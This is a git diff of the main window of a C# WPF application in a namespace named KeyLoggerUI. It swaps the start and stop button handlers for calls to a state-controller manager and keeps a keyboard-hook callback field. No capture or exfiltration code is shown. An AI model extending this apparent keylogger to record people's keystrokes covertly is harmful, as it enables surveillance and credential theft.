@@ -17,7 +17,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Threading;
 using KDAUILibrary.Helpers;
-using KDACore.Logic;
+using KDACore.Helpers;
 using KDASharedLibrary.Enums;
 using KDASharedLibrary.Helpers;
 using Microsoft.Win32;
@@ -25,6 +25,8 @@ using KDASharedLibrary.DataAccess;
 using KDASharedLibrary.Models;
 using KDACore;
 using KDACore.Enums;
+using KDAUILibrary;
+using KDACore.Managers;
 
 namespace KeyLoggerUI
 {
@@ -35,13 +37,15 @@ namespace KeyLoggerUI
     {
         CancellationTokenSource cts = new CancellationTokenSource();
         NativeMethods.HookProc callback = KeystrokesManager.CallbackFunction;
+        StateControllersManager mngr;
         public MainWindow()
         {
             InitializeComponent();
             //SetTime();
-            var mngr = KeystrokesManager.GetKeyStrokesManager();
-            runBtn.IsEnabled = true;
-            stopBtn.IsEnabled = false;
+            //var mngr = KeystrokesManager.GetKeyStrokesManager();
+            //runBtn.IsEnabled = true;
+            //stopBtn.IsEnabled = false;
+            mngr = StateControllersManager.GetStateController();            
         }
         //void SetTime()
         //{
@@ -72,29 +76,31 @@ namespace KeyLoggerUI
         //}
         private async void runBtn_Click(object sender, RoutedEventArgs e)
         {
-            try
-            {
-                runBtn.IsEnabled = false;
-                stopBtn.IsEnabled = true;
-                //Task.Run(() => CheckForLogin());
-                LoggingStatus l = LoggingStatus.Running;
-                StateController.GetStateController().Run(l);
-            }
-            catch (Exception)
-            {
+            mngr.Run();
+            //try
+            //{
+            //    runBtn.IsEnabled = false;
+            //    stopBtn.IsEnabled = true;
+            //    //Task.Run(() => CheckForLogin());
+            //    LoggingStatus l = LoggingStatus.Running;
+            //    StateController.GetStateController().Run(l);
+            //}
+            //catch (Exception)
+            //{
 
-                return;
-            }
-
+            //    return;
+            //}
+            
         }
 
         private void stopBtn_Click(object sender, RoutedEventArgs e)
         {
-            cts.Cancel();
-            cts = new CancellationTokenSource();
-            Trace.Listeners.Clear();
-            runBtn.IsEnabled = true;
-            stopBtn.IsEnabled = false;
+            mngr.Stop();
+            //cts.Cancel();
+            //cts = new CancellationTokenSource();
+            //Trace.Listeners.Clear();
+            //runBtn.IsEnabled = true;
+            //stopBtn.IsEnabled = false;
         }
 
         void RunAsync(CancellationToken cancellationToken)
